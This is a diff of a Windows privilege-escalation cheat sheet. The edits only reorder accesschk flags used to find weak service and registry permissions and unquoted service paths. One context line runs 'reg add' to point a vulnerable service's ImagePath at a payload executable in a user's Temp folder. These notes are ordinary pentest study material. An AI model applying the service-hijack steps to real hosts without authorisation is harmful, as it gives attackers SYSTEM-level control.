@@ -76,8 +76,8 @@ DACL for registry keys, files, processes, users and groups, and services
 For Windows XP, version 5.2 is needed: https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe
 Useful feature: it returns objects to which a particular user or group may have write access
 
-accesschk.exe -uwcqv "User" * 
-accesschk.exe -kvuqsw hklm\System\CurrentControlSet\services
+accesschk.exe -quwcv "User" * 
+accesschk.exe -quwcvks hklm\System\CurrentControlSet\services
 
 # UNQUOTED SERVICE PATHS
 wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """ 
@@ -89,10 +89,10 @@ sc qc Service1
 Search for services that have a binary path (binpath) property which can be modified by non-Admin users.
 *Windows XP shipped with several vulnerable built-in services. 
 
-accesschk.exe -uwcqv "Authenticated Users" * /accepteula
-accesschk.exe -uwcqv Everyone * /accepteula
-accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
-accesschk.exe -qdws Users C:\Windows\ 
+accesschk.exe -quvwc "Authenticated Users" * /accepteula
+accesschk.exe -quvwc Everyone * /accepteula
+accesschk.exe -qwds "Authenticated Users" C:\Windows\ /accepteula
+accesschk.exe -qwds Users C:\Windows\ 
 
 sc qc Service1
 
@@ -108,8 +108,8 @@ sc start <vuln-service>
 
 # INSECURE REGISTRY PERMISSIONS
 
-accesschk.exe -quvcw *		      	-->  DACLs of every service
-accesschk.exe -quvcw Service1 	-->	 DACLs of one service
+accesschk.exe -quvwc *		      	-->  DACLs of every service
+accesschk.exe -quvwc Service1 	-->	 DACLs of one service
 
 Change the Imagepath to our binary. It needs to restart the computer? or restarting the service is enough? Not sure!
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
